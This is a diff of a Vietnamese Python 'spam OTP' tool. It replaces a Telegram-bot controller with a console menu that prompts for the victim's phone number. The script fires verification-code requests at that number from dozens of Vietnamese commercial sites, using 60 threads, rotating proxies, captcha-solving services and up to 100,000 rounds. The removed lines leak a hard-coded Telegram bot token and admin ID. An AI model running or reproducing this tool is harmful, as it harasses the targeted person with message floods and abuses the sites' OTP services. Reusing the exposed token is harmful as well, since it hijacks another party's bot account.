@@ -1,8 +1,4 @@
-# tool_spam_otp_gzii_telegram.py
-# Gzii - Smart filter + Delay + KEY + TELEGRAM BOT
-# Key mặc định: GziNee
 # mod made by Bui Vinh text
-
 import os
 import sys
 import io
@@ -16,64 +12,49 @@ import requests
 import concurrent.futures
 from threading import BoundedSemaphore
 from urllib.parse import urlparse
-from datetime import datetime
-
 sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', line_buffering=True)
-
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 warnings.filterwarnings("ignore")
-
-# ============ CẤU HÌNH TELEGRAM ============
-TELEGRAM_BOT_TOKEN = "8253814357:AAF6pZqZkxIcNYl9-HJTbw-u1fk3N_FlUas"
-TELEGRAM_ADMIN_ID  = 7203074291   # <-- ID telegram của mày (int), lấy qua @userinfobot
-
-# ============ KEY CỐ ĐỊNH ============
-DEFAULT_KEY = "GziNee"          # <-- key mặc định, không đổi
-KEY_FILE = "key.json"           # lưu trạng thái đã xác thực
-
-def is_key_verified():
-    """Kiểm tra user đã xác thực key chưa (lưu vào file)."""
-    if os.path.exists(KEY_FILE):
-        try:
-            with open(KEY_FILE, "r", encoding="utf-8") as f:
-                data = json.load(f)
-            return data.get("key") == DEFAULT_KEY
-        except Exception:
-            return False
-    return False
-
-def save_verified():
-    """Lưu trạng thái đã xác thực key."""
-    with open(KEY_FILE, "w", encoding="utf-8") as f:
-        json.dump({"key": DEFAULT_KEY, "verified_at": datetime.now().isoformat()}, f)
-
-# ============ CẤU HÌNH TOOL ============
+from colorama import Fore, Style, init
+init(autoreset=True)
 MAX_THREADS = 60
 PROXY_FILE = "live.txt"
 TIMEOUT_LIVE = 8
 TIMEOUT_DEAD = 3
 RETRY = 1
-
-DELAY_REQ_MIN = 0.0
-DELAY_REQ_MAX = 0.0
-DELAY_ROUND_MIN = 3
-DELAY_ROUND_MAX = 3
-
+DELAY_REQ_MIN = 0.0 
+DELAY_REQ_MAX = 0.0    
+DELAY_ROUND_MIN = 3  
+DELAY_ROUND_MAX = 3   
+#capcha neu co
 CAPTCHA_PROVIDER = "2captcha"
 CAPTCHA_API_KEY  = ""
-
-# ============ PROXY ============
+#Banner
+def banner():
+    os.system('cls' if os.name == 'nt' else 'clear')
+    neon = Fore.CYAN + Style.BRIGHT
+    txt = f"""
+{neon}  ██████╗ ███████╗██╗██╗
+{neon} ██╔════╝ ╚══███╔╝██║██║
+{neon} ██║  ███╗  ███╔╝ ██║██║
+{neon} ██║   ██║ ███╔╝  ██║██║
+{neon} ╚██████╔╝███████╗██║██║
+{neon}  ╚═════╝ ╚══════╝╚═╝╚═╝
+{Fore.MAGENTA}        TOOL SPAM OTP - GZII
+{Fore.YELLOW}        mod made by Bui Vinh text
+{Style.RESET_ALL}"""
+    for ch in txt:
+        sys.stdout.write(ch); sys.stdout.flush(); time.sleep(0.001)
+#proxy
 def load_proxies():
     if not os.path.exists(PROXY_FILE):
         return []
     with open(PROXY_FILE, "r", encoding="utf-8") as f:
         return [l.strip() for l in f if l.strip() and ":" in l]
-
 PROXIES = load_proxies()
 _lock = threading.Lock()
 _idx = 0
-
 def get_proxy():
     global _idx
     if not PROXIES:
@@ -82,8 +63,7 @@ def get_proxy():
         p = PROXIES[_idx % len(PROXIES)]
         _idx += 1
     return {"http": f"http://{p}", "https": f"http://{p}"}
-
-# ============ HTTP CORE ============
+#http core
 DNS_DEAD_HOSTS = set()
 _dns_lock = threading.Lock()
 
@@ -94,23 +74,27 @@ def req(method, url, **kw):
             raise requests.exceptions.ConnectionError(f"[DNS-BLACKLISTED] {host}")
     kw.setdefault("timeout", TIMEOUT_LIVE)
     px = get_proxy()
-    if px: kw["proxies"] = px
+    if px:
+        kw["proxies"] = px
     kw.setdefault("verify", False)
     kw.setdefault("allow_redirects", True)
     for attempt in range(RETRY + 1):
         try:
             return requests.request(method, url, **kw)
         except requests.exceptions.ConnectionError as e:
-            if "getaddrinfo failed" in str(e) or "NameResolutionError" in str(e):
-                with _dns_lock: DNS_DEAD_HOSTS.add(host)
+            msg = str(e)
+            if "getaddrinfo failed" in msg or "NameResolutionError" in msg:
+                with _dns_lock:
+                    DNS_DEAD_HOSTS.add(host)
                 raise
-            if attempt < RETRY: time.sleep(0.3); continue
+            if attempt < RETRY:
+                time.sleep(0.3); continue
             raise
         except (requests.exceptions.Timeout, requests.exceptions.SSLError):
-            if attempt < RETRY: time.sleep(0.3); continue
+            if attempt < RETRY:
+                time.sleep(0.3); continue
             raise
-
-# ============ CAPTCHA ============
+#capcha
 def solve_recaptcha(sitekey, pageurl, invisible=True):
     if not CAPTCHA_API_KEY or not CAPTCHA_PROVIDER:
         return None
@@ -121,20 +105,41 @@ def solve_recaptcha(sitekey, pageurl, invisible=True):
                 "googlekey": sitekey, "pageurl": pageurl,
                 "invisible": 1 if invisible else 0, "json": 1,
             }, timeout=15).json()
-            if r.get("status") != 1: return None
+            if r.get("status") != 1:
+                return None
             job_id = r["request"]
             for _ in range(30):
                 time.sleep(5)
                 res = requests.get("http://2captcha.com/res.php", params={
-                    "key": CAPTCHA_API_KEY, "action": "get", "id": job_id, "json": 1,
+                    "key": CAPTCHA_API_KEY, "action": "get",
+                    "id": job_id, "json": 1,
                 }, timeout=15).json()
-                if res.get("status") == 1: return res["request"]
-                if res.get("request") != "CAPCHA_NOT_READY": return None
+                if res.get("status") == 1:
+                    return res["request"]
+                if res.get("request") != "CAPCHA_NOT_READY":
+                    return None
+        elif CAPTCHA_PROVIDER == "anticaptcha":
+            r = requests.post("https://api.anti-captcha.com/createTask", json={
+                "clientKey": CAPTCHA_API_KEY,
+                "task": {"type": "RecaptchaV2TaskProxyless",
+                         "websiteURL": pageurl, "websiteKey": sitekey,
+                         "isInvisible": invisible}
+            }, timeout=15).json()
+            if r.get("errorId") != 0:
+                return None
+            task_id = r["taskId"]
+            for _ in range(30):
+                time.sleep(5)
+                res = requests.post("https://api.anti-captcha.com/getTaskResult", json={
+                    "clientKey": CAPTCHA_API_KEY, "taskId": task_id,
+                }, timeout=15).json()
+                if res.get("status") == "ready":
+                    return res["solution"]["gRecaptchaResponse"]
+                if res.get("errorId") != 0:
+                    return None
     except Exception:
         return None
     return None
-
-# ============ HELPER ============
 last_names = ['Nguyễn','Trần','Lê','Phạm','Võ','Hoàng']
 middle_names = ['Vân','Thị','Quang','Hoàng','Anh','Thanh']
 first_names = ['Nam','Tuấn','Hương','Linh','Long','Duy']
@@ -142,69 +147,25 @@ def rand_name():
     return f"{random.choice(last_names)} {random.choice(middle_names)} {random.choice(first_names)}"
 def rand_id(n=32):
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=n))
-
 random_id = rand_id()
 formatted_device_id = f"{random_id[:8]}-{random_id[8:12]}-{random_id[12:16]}-{random_id[16:20]}-{random_id[20:]}"
 UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'
-
-# ============ TELEGRAM SENDER ============
-_tg_lock = threading.Lock()
-
-def tg_send(chat_id, text, parse_mode=None):
-    """Gửi tin nhắn telegram. Tự chia nếu dài."""
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    try:
-        max_len = 4000
-        chunks = [text[i:i+max_len] for i in range(0, len(text), max_len)]
-        for chunk in chunks:
-            payload = {"chat_id": chat_id, "text": chunk}
-            if parse_mode:
-                payload["parse_mode"] = parse_mode
-            with _tg_lock:
-                requests.post(url, json=payload, timeout=15)
-    except Exception as e:
-        print(f"[TG-ERROR] {e}")
-
-# ============ LOG ============
+#ham log
+_log_lock = threading.Lock()
 _current_success = set()
 _success_lock = threading.Lock()
-_log_buffer = []
-_buffer_lock = threading.Lock()
-_log_timer = None
-
-def _flush_log():
-    global _log_buffer, _log_timer
-    with _buffer_lock:
-        if not _log_buffer:
-            _log_timer = None
-            return
-        msg = "\n".join(_log_buffer)
-        _log_buffer = []
-        _log_timer = None
-    if TELEGRAM_ADMIN_ID:
-        tg_send(TELEGRAM_ADMIN_ID, msg)
-
-def log_line(s):
-    global _log_timer
-    with _buffer_lock:
-        _log_buffer.append(s)
-        if _log_timer is None:
-            _log_timer = threading.Timer(2.0, _flush_log)
-            _log_timer.daemon = True
-            _log_timer.start()
 
 def ok(site, fn_name=None):
-    log_line(f"✅ {site} đã gửi thành công")
+    with _log_lock:
+        print(Fore.GREEN + Style.BRIGHT + f"{site} đã gửi thành công")
     if fn_name:
         with _success_lock:
             _current_success.add(fn_name)
 
 def fail(site, code=""):
-    log_line(f"❌ {site} thất bại {code}")
-
-# ============ CÁC HÀM SPAM ============
-# (giữ nguyên toàn bộ — paste y nguyên từ bản trước)
-
+    with _log_lock:
+        print(Fore.RED + f"{site} thất bại {code}")
+#Ham api spam
 def XWXWWWXWWWXXXXXXWW(sdt):
     try:
         r = req("POST", 'https://www.sapo.vn/fnb/sendotp',
@@ -312,16 +273,23 @@ def GHN_V3(sdt):
             'accept': 'application/json',
             'accept-language': 'vi,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
             'content-type': 'application/json',
-            'origin': 'https://sso.ghn.vn', 'referer': 'https://sso.ghn.vn/',
-            'user-agent': UA, 'x-client-type': 'web',
+            'origin': 'https://sso.ghn.vn',
+            'referer': 'https://sso.ghn.vn/',
+            'user-agent': UA,
+            'x-client-type': 'web',
             'x-device-id': rand_id(32).lower(),
-            'sec-fetch-site': 'same-site', 'sec-fetch-mode': 'cors', 'sec-fetch-dest': 'empty',
+            'sec-fetch-site': 'same-site',
+            'sec-fetch-mode': 'cors',
+            'sec-fetch-dest': 'empty',
         }
         r = req("POST", 'https://online-gateway.ghn.vn/sso/public-api/v3/client/auth/start',
                   headers=headers, json={'identifier': sdt, 'identifier_type': 'phone'})
-        if r.status_code == 200: ok("ghn.vn-v3", "GHN_V3")
-        else: fail("ghn.vn-v3", r.status_code)
-    except Exception: fail("ghn.vn-v3")
+        if r.status_code == 200:
+            ok("ghn.vn-v3", "GHN_V3")
+        else:
+            fail("ghn.vn-v3", r.status_code)
+    except Exception:
+        fail("ghn.vn-v3")
 
 def MNMNNNMNMNMNNNMMNNMN(sdt):
     try:
@@ -387,15 +355,23 @@ def NTTLC_V2(sdt):
         headers = {
             'accept': 'application/json, text/plain, */*',
             'accept-language': 'vi,en;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
-            'access-control-allow-origin': '*', 'content-type': 'application/json',
-            'order-channel': '1', 'origin': 'https://nhathuoclongchau.com.vn',
-            'referer': 'https://nhathuoclongchau.com.vn/', 'user-agent': UA, 'x-channel': 'EStore',
+            'access-control-allow-origin': '*',
+            'content-type': 'application/json',
+            'order-channel': '1',
+            'origin': 'https://nhathuoclongchau.com.vn',
+            'referer': 'https://nhathuoclongchau.com.vn/',
+            'user-agent': UA,
+            'x-channel': 'EStore',
         }
-        r = req("POST", 'https://api.nhathuoclongchau.com.vn/lccus/is/user/v2/send-verification',
-                  headers=headers, json={'phoneNumber': sdt, 'otpType': 0, 'fromSys': 'WEBKHLC'})
-        if r.status_code == 200: ok("nhathuoclongchau.com.vn-v3", "NTTLC_V2")
-        else: fail("nhathuoclongchau.com.vn-v3", r.status_code)
-    except Exception: fail("nhathuoclongchau.com.vn-v3")
+        r = req("POST",
+            'https://api.nhathuoclongchau.com.vn/lccus/is/user/v2/send-verification',
+            headers=headers, json={'phoneNumber': sdt, 'otpType': 0, 'fromSys': 'WEBKHLC'})
+        if r.status_code == 200:
+            ok("nhathuoclongchau.com.vn-v3", "NTTLC_V2")
+        else:
+            fail("nhathuoclongchau.com.vn-v3", r.status_code)
+    except Exception:
+        fail("nhathuoclongchau.com.vn-v3")
 
 def O00oOoOo0O0Oo0OO00OO0(sdt):
     try:
@@ -913,7 +889,8 @@ def KINGFOODMART_ZALO(sdt):
             fail("kingfoodmart.com-zalo", "captcha")
         else:
             fail("kingfoodmart.com-zalo", r.status_code)
-    except Exception: fail("kingfoodmart.com-zalo")
+    except Exception:
+        fail("kingfoodmart.com-zalo")
 
 def GUARDIAN(sdt):
     try:
@@ -935,11 +912,13 @@ def NTTLC_ZALO(sdt):
             'order-channel': '1', 'origin': 'https://nhathuoclongchau.com.vn',
             'referer': 'https://nhathuoclongchau.com.vn/', 'user-agent': UA, 'x-channel': 'EStore',
         }
-        r = req("POST", 'https://api.nhathuoclongchau.com.vn/lccus/is/user/v2/send-verification',
-                  headers=headers, json={'phoneNumber': sdt, 'otpType': 1, 'fromSys': 'WEBKHLC'})
+        r = req("POST",
+            'https://api.nhathuoclongchau.com.vn/lccus/is/user/v2/send-verification',
+            headers=headers, json={'phoneNumber': sdt, 'otpType': 1, 'fromSys': 'WEBKHLC'})
         if r.status_code == 200: ok("nhathuoclongchau.com.vn-zalo", "NTTLC_ZALO")
         else: fail("nhathuoclongchau.com.vn-zalo", r.status_code)
-    except Exception: fail("nhathuoclongchau.com.vn-zalo")
+    except Exception:
+        fail("nhathuoclongchau.com.vn-zalo")
 
 def HOANGPHUC_V2(sdt):
     try:
@@ -969,7 +948,8 @@ def HOANGPHUC_V2(sdt):
             ok("hoangphuconline.vn", "HOANGPHUC_V2")
         else:
             fail("hoangphuconline.vn", r2.status_code)
-    except Exception: fail("hoangphuconline.vn")
+    except Exception:
+        fail("hoangphuconline.vn")
 
 def BATDONGSAN_V2(sdt):
     try:
@@ -990,7 +970,8 @@ def BATDONGSAN_V2(sdt):
         if r.status_code == 200: ok("batdongsan.com.vn", "BATDONGSAN_V2")
         elif r.status_code == 403: fail("batdongsan.com.vn", "cloudflare")
         else: fail("batdongsan.com.vn", r.status_code)
-    except Exception: fail("batdongsan.com.vn")
+    except Exception:
+        fail("batdongsan.com.vn")
 
 def DOMINOS_V2(sdt):
     try:
@@ -1010,9 +991,8 @@ def DOMINOS_V2(sdt):
         if r.status_code == 200: ok("dominos.vn", "DOMINOS_V2")
         elif r.status_code == 404: fail("dominos.vn", "dmn-header")
         else: fail("dominos.vn", r.status_code)
-    except Exception: fail("dominos.vn")
-
-# ============ LIST HÀM ============
+    except Exception:
+        fail("dominos.vn")
 ALL_FUNCTIONS = [
     XWXWWWXWWWXXXXXXWW, lIlIlllllllIllIlI, S2S22SS22SSSSSSSSS2SS, OODOOooDoOOoOoOooDD,
     JIILIILJJILJJILJIILLJILI, lIIllIlllIIllIIlIllI, DOOOOoDDDOODDDDoDooO,
@@ -1033,222 +1013,98 @@ ALL_FUNCTIONS = [
     VAYVND_NET, SAPO_ACCOUNTS, SSI_IBOARD,
     VIETTELSTORE_SMS, VIETTELSTORE_ZALO, GUARDIAN, KINGFOODMART_ZALO,
 ]
-
-# ============ BOT LOGIC ============
-bot_state = {
-    "running": False,
-    "sdt": None,
-    "total_rounds": 0,
-    "current_round": 0,
-    "active_funcs": [],
-    "thread": None,
-    "stop_flag": False,
-}
-
+sem = BoundedSemaphore(MAX_THREADS)
 def _safe_call(fn, sdt):
+    # delay random
+    if DELAY_REQ_MAX > 0:
+        time.sleep(random.uniform(DELAY_REQ_MIN, DELAY_REQ_MAX))
     try:
         fn(sdt)
     except Exception:
         pass
+def run_round(sdt, i, active_functions):
+    with _success_lock:
+        _current_success.clear()
+    print(Fore.CYAN + Style.BRIGHT + f"\n┌─ ROUND {i} ── {len(active_functions)} hàm ──────────")
+    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
+        futs = [ex.submit(_safe_call, fn, sdt) for fn in active_functions]
+        for f in concurrent.futures.as_completed(futs):
+            pass
+    print(Fore.CYAN + Style.BRIGHT + f"└─ Kết thúc round {i} ── Sống: {len(_current_success)}/{len(active_functions)} ──")
+    alive = [fn for fn in active_functions if fn.__name__ in _current_success]
+    return alive
+def ask_config():
+    global DELAY_REQ_MIN, DELAY_REQ_MAX, DELAY_ROUND_MIN, DELAY_ROUND_MAX
+    print(Fore.CYAN + Style.BRIGHT + "\n========== CẤU HÌNH DELAY ==========")
+    print(Fore.YELLOW + "[1] Không delay (nhanh nhất, dễ bị rate-limit)")
+    print(Fore.YELLOW + "[2] Delay nhẹ (0.1-0.5s/request, 3-5s/round)")
+    print(Fore.YELLOW + "[3] Delay vừa (0.5-1.5s/request, 5-10s/round)")
+    print(Fore.YELLOW + "[4] Delay mạnh (1-3s/request, 10-20s/round, an toàn nhất)")
+    print(Fore.YELLOW + "[5] Tùy chỉnh thủ công")
+    print(Fore.YELLOW + "[6] Bỏ qua (mặc định = không delay)")
+    choice = input(Fore.CYAN + Style.BRIGHT + "[?] Chọn (1-6, Enter=6): " + Style.RESET_ALL).strip() or "6"
+    if choice == "1" or choice == "6":
+        DELAY_REQ_MIN, DELAY_REQ_MAX = 0.0, 0.0
+        DELAY_ROUND_MIN, DELAY_ROUND_MAX = 3, 3
+    elif choice == "2":
+        DELAY_REQ_MIN, DELAY_REQ_MAX = 0.1, 0.5
+        DELAY_ROUND_MIN, DELAY_ROUND_MAX = 3, 5
+    elif choice == "3":
+        DELAY_REQ_MIN, DELAY_REQ_MAX = 0.5, 1.5
+        DELAY_ROUND_MIN, DELAY_ROUND_MAX = 5, 10
+    elif choice == "4":
+        DELAY_REQ_MIN, DELAY_REQ_MAX = 1.0, 3.0
+        DELAY_ROUND_MIN, DELAY_ROUND_MAX = 10, 20
+    elif choice == "5":
+        try:
+            DELAY_REQ_MIN = float(input(Fore.CYAN + "  Delay min giữa request (giây, vd 0.5): " + Style.RESET_ALL) or "0")
+            DELAY_REQ_MAX = float(input(Fore.CYAN + "  Delay max giữa request (giây, vd 1.5): " + Style.RESET_ALL) or str(DELAY_REQ_MIN))
+            DELAY_ROUND_MIN = int(input(Fore.CYAN + "  Delay min giữa round (giây, vd 5): " + Style.RESET_ALL) or "3")
+            DELAY_ROUND_MAX = int(input(Fore.CYAN + "  Delay max giữa round (giây, vd 10): " + Style.RESET_ALL) or str(DELAY_ROUND_MIN))
+        except ValueError:
+            print(Fore.RED + "[!] Nhập sai, dùng mặc định (không delay)")
+            DELAY_REQ_MIN, DELAY_REQ_MAX = 0.0, 0.0
+            DELAY_ROUND_MIN, DELAY_ROUND_MAX = 3, 3
+    else:
+        DELAY_REQ_MIN, DELAY_REQ_MAX = 0.0, 0.0
+        DELAY_ROUND_MIN, DELAY_ROUND_MAX = 3, 3
+    print(Fore.GREEN + f"\n[✓] Cấu hình delay:")
+    print(Fore.GREEN + f"    - Request: {DELAY_REQ_MIN}s → {DELAY_REQ_MAX}s")
+    print(Fore.GREEN + f"    - Round  : {DELAY_ROUND_MIN}s → {DELAY_ROUND_MAX}s")
+if __name__ == "__main__":
+    banner()
+    sdt = input(Fore.CYAN + Style.BRIGHT + "[?] Nhập SĐT nạn nhân: " + Style.RESET_ALL).strip()
+    if not sdt:
+        print(Fore.RED + "[!] Chưa nhập SĐT."); sys.exit(1)
 
-def run_spam_loop(sdt, total_rounds, delay_req_min, delay_req_max,
-                  delay_round_min, delay_round_max, chat_id):
-    global bot_state
+    try:
+        count = int(input(Fore.CYAN + "[?] Số vòng (Enter=100000): " + Style.RESET_ALL) or "100000")
+    except ValueError:
+        count = 100000
+    ask_config()
 
-    bot_state["running"] = True
-    bot_state["stop_flag"] = False
-    bot_state["sdt"] = sdt
-    bot_state["total_rounds"] = total_rounds
-    bot_state["current_round"] = 0
-    bot_state["active_funcs"] = ALL_FUNCTIONS[:]
-
-    tg_send(chat_id, f"🚀 BẮT ĐẦU SPAM\n"
-                     f"📱 SĐT: {sdt}\n"
-                     f"🔁 Số vòng: {total_rounds}\n"
-                     f"⚙️ Hàm ban đầu: {len(ALL_FUNCTIONS)}\n"
-                     f"🧵 Threads: {MAX_THREADS}\n"
-                     f"🌐 Proxy: {len(PROXIES)}")
+    print(Fore.MAGENTA + f"\n[*] Target: {sdt} | {count} vòng | {len(ALL_FUNCTIONS)} hàm ban đầu | {MAX_THREADS} threads | {len(PROXIES)} proxy")
+    print(Fore.YELLOW + "[*] Round 1 chạy HẾT. Round 2+ chỉ chạy hàm sống ở round trước.\n")
 
     active = ALL_FUNCTIONS[:]
 
-    for i in range(1, total_rounds + 1):
-        if bot_state["stop_flag"]:
-            tg_send(chat_id, "⛔ Đã dừng theo yêu cầu.")
-            break
-
+    for i in range(1, count+1):
         if not active:
-            tg_send(chat_id, "⚠️ Hết hàm sống. Dừng tool.")
+            print(Fore.RED + Style.BRIGHT + "\n[!] Hết hàm sống. Dừng tool.")
+            break
+        new_active = run_round(sdt, i, active)
+
+        if not new_active:
+            print(Fore.RED + Style.BRIGHT + "\n[!] Không có hàm nào gửi thành công. Dừng tool.")
             break
 
-        bot_state["current_round"] = i
-        with _success_lock:
-            _current_success.clear()
-
-        tg_send(chat_id, f"┌─ ROUND {i}/{total_rounds} ── {len(active)} hàm ──")
-
-        with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_THREADS) as ex:
-            futs = []
-            for fn in active:
-                if delay_req_max > 0:
-                    time.sleep(random.uniform(delay_req_min, delay_req_max))
-                futs.append(ex.submit(_safe_call, fn, sdt))
-            for f in concurrent.futures.as_completed(futs):
-                pass
-
-        alive = [fn for fn in active if fn.__name__ in _current_success]
-        tg_send(chat_id, f"└─ ROUND {i} xong ── Sống: {len(alive)}/{len(active)}")
-
-        if not alive:
-            tg_send(chat_id, "⚠️ Không còn hàm nào gửi được. Dừng.")
-            break
-
-        if len(alive) < len(active):
-            tg_send(chat_id, f"🔎 Lọc bỏ {len(active)-len(alive)} hàm chết. Còn {len(alive)} hàm.")
-        active = alive
-        bot_state["active_funcs"] = active
-
-        delay = random.randint(delay_round_min, delay_round_max)
-        time.sleep(delay)
-
-    tg_send(chat_id, f"✅ HOÀN TẤT\n"
-                     f"📱 SĐT: {sdt}\n"
-                     f"🔁 Đã chạy: {bot_state['current_round']}/{total_rounds}\n"
-                     f"💚 Hàm còn sống: {len(bot_state['active_funcs'])}")
-    bot_state["running"] = False
-
-# ============ TELEGRAM POLLING ============
-def tg_get_updates(offset=None):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-    params = {"timeout": 30}
-    if offset:
-        params["offset"] = offset
-    try:
-        r = requests.get(url, params=params, timeout=35).json()
-        return r.get("result", [])
-    except Exception:
-        return []
-
-def handle_command(msg):
-    chat_id = msg["chat"]["id"]
-    user_id = msg["from"]["id"]
-    text = (msg.get("text") or "").strip()
-
-    # Chỉ cho admin dùng
-    if TELEGRAM_ADMIN_ID and user_id != TELEGRAM_ADMIN_ID:
-        tg_send(chat_id, "⛔ Bạn không có quyền dùng bot này.")
-        return
-
-    # ====== XÁC THỰC KEY ======
-    if not is_key_verified():
-        # Nếu chưa xác thực và text khác key → yêu cầu nhập key
-        if text != DEFAULT_KEY:
-            tg_send(chat_id,
-                "🔒 BOT CHƯA ĐƯỢC KÍCH HOẠT\n\n"
-                "Gửi key để bắt đầu:\n"
-                f"Key mặc định: `{DEFAULT_KEY}`",
-                parse_mode="Markdown")
-            return
-        else:
-            # Nhập đúng key
-            save_verified()
-            tg_send(chat_id,
-                "✅ KÍCH HOẠT THÀNH CÔNG\n\n"
-                "Gõ /start để xem menu lệnh.")
-            return
-
-    # ====== MENU SAU KHI ĐÃ XÁC THỰC ======
-    if text == "/start":
-        tg_send(chat_id,
-            "🤖 BOT SPAM OTP — Gzii\n\n"
-            "📌 Lệnh:\n"
-            "/spam <sđt> <số_vòng> — Bắt đầu spam\n"
-            "/stop — Dừng spam\n"
-            "/status — Xem trạng thái\n"
-            "/proxy — Xem số proxy\n"
-            "/help — Trợ giúp"
-        )
-        return
-
-    if text.startswith("/spam"):
-        if bot_state["running"]:
-            tg_send(chat_id, "⚠️ Đang chạy rồi. Dùng /stop trước.")
-            return
-        parts = text.split()
-        if len(parts) < 2:
-            tg_send(chat_id, "❌ Cú pháp: /spam <sđt> [số_vòng]\nVí dụ: /spam 0343458245 100")
-            return
-        sdt = parts[1].strip()
-        try:
-            rounds = int(parts[2]) if len(parts) > 2 else 100
-        except ValueError:
-            rounds = 100
-
-        bot_state["thread"] = threading.Thread(
-            target=run_spam_loop,
-            args=(sdt, rounds, 0.3, 1.0, 5, 10, chat_id),
-            daemon=True
-        )
-        bot_state["thread"].start()
-        return
-
-    if text == "/stop":
-        if bot_state["running"]:
-            bot_state["stop_flag"] = True
-            tg_send(chat_id, "⛔ Đã gửi tín hiệu dừng. Chờ round hiện tại xong...")
-        else:
-            tg_send(chat_id, "ℹ️ Bot không chạy.")
-        return
-
-    if text == "/status":
-        if bot_state["running"]:
-            tg_send(chat_id,
-                f"🟢 ĐANG CHẠY\n"
-                f"📱 SĐT: {bot_state['sdt']}\n"
-                f"🔁 Round: {bot_state['current_round']}/{bot_state['total_rounds']}\n"
-                f"💚 Hàm sống: {len(bot_state['active_funcs'])}"
-            )
-        else:
-            tg_send(chat_id, "🔴 Bot đang rảnh.")
-        return
-
-    if text == "/proxy":
-        tg_send(chat_id, f"🌐 Proxy: {len(PROXIES)} cái")
-        return
-
-    if text == "/help":
-        tg_send(chat_id,
-            "📖 HƯỚNG DẪN\n\n"
-            "1️⃣ Gửi key mặc định để kích hoạt\n"
-            "2️⃣ /spam <sđt> <số_vòng> để bắt đầu\n"
-            "3️⃣ /status xem tiến độ\n"
-            "4️⃣ /stop để dừng\n\n"
-            "⚙️ Delay mặc định: 0.3-1s/request, 5-10s/round"
-        )
-        return
-
-# ============ MAIN ============
-if __name__ == "__main__":
-    print(f"[*] Bot đang khởi động... Token: {TELEGRAM_BOT_TOKEN[:20]}...")
-    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "DÁN_TOKEN_BOT_TELEGRAM_VÀO_ĐÂY":
-        print("[!] Chưa điền TELEGRAM_BOT_TOKEN")
-        sys.exit(1)
-
-    if TELEGRAM_ADMIN_ID:
-        status = "đã xác thực" if is_key_verified() else "chưa xác thực"
-        tg_send(TELEGRAM_ADMIN_ID, f"🤖 Bot đã online!\nKey: {status}")
-
-    last_update_id = None
-    print("[✓] Bot đang chạy. Nhấn Ctrl+C để dừng.")
-    while True:
-        try:
-            updates = tg_get_updates(last_update_id)
-            for upd in updates:
-                last_update_id = upd["update_id"] + 1
-                if "message" in upd:
-                    handle_command(upd["message"])
-        except KeyboardInterrupt:
-            print("\n[*] Bot dừng.")
-            break
-        except Exception as e:
-            print(f"[!] Lỗi polling: {e}")
-            time.sleep(3)
+        if len(new_active) < len(active):
+            removed = len(active) - len(new_active)
+            print(Fore.YELLOW + f"[FILTER] Đã loại {removed} hàm chết. Còn {len(new_active)} hàm cho round sau.")
+        active = new_active
+        #delay 
+        delay = random.randint(DELAY_ROUND_MIN, DELAY_ROUND_MAX)
+        for j in range(delay, 0, -1):
+            sys.stdout.write(Fore.YELLOW + f"  Nghỉ {j}s...\r"); sys.stdout.flush()
+            time.sleep(1)
+        sys.stdout.write(" "*40 + "\r")
